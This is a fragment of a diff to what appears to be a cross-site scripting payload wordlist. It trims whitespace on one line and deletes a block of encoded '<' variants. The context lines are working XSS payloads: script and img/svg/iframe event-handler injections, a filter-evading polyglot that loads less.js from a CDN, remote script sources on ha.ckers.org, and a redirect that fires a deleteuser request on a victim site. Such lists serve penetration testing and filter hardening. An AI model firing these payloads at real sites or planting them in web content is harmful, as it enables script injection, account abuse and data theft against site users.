 '"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Style /Type=text/less>k{n:'function(){confirm(1)}()'}</Style/><Script /Src=https:cdnjs.cloudflare.com/ajax/libs/less.js/2.7.1/less.min.js></Script/>
 <script>alert(123);</script>
 <ScRipT>alert("XSS");</ScRipT>
@@ -449,7 +399,7 @@ rootbakar<!'/*"/*\'/*\"/*--></Script><Image Srcset=K */; Onerror=alert(document.
 <IMG SRC=jAVasCrIPt:alert('XSS')>
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
-<IMG SRC=javascript:alert('XSS')>      
+<IMG SRC=javascript:alert('XSS')>
 <img src=xss onerror=alert(1)>
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
 <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
@@ -701,71 +651,6 @@ Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
 &lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
 &lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
 &lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
-&lt;
-%3C
-&lt
-&lt;
-&LT
-&LT;
-&#60
-&#060
-&#0060
-&#00060
-&#000060
-&#0000060
-&lt;
-&#x3c
-&#x03c
-&#x003c
-&#x0003c
-&#x00003c
-&#x000003c
-&#x3c;
-&#x03c;
-&#x003c;
-&#x0003c;
-&#x00003c;
-&#x000003c;
-&#X3c
-&#X03c
-&#X003c
-&#X0003c
-&#X00003c
-&#X000003c
-&#X3c;
-&#X03c;
-&#X003c;
-&#X0003c;
-&#X00003c;
-&#X000003c;
-&#x3C
-&#x03C
-&#x003C
-&#x0003C
-&#x00003C
-&#x000003C
-&#x3C;
-&#x03C;
-&#x003C;
-&#x0003C;
-&#x00003C;
-&#x000003C;
-&#X3C
-&#X03C
-&#X003C
-&#X0003C
-&#X00003C
-&#X000003C
-&#X3C;
-&#X03C;
-&#X003C;
-&#X0003C;
-&#X00003C;
-&#X000003C;
-\x3c
-\x3C
-\u003c
-\u003C
 &lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
 &lt;IMG SRC=\"javascript&#058;alert('XSS')\"
 &lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
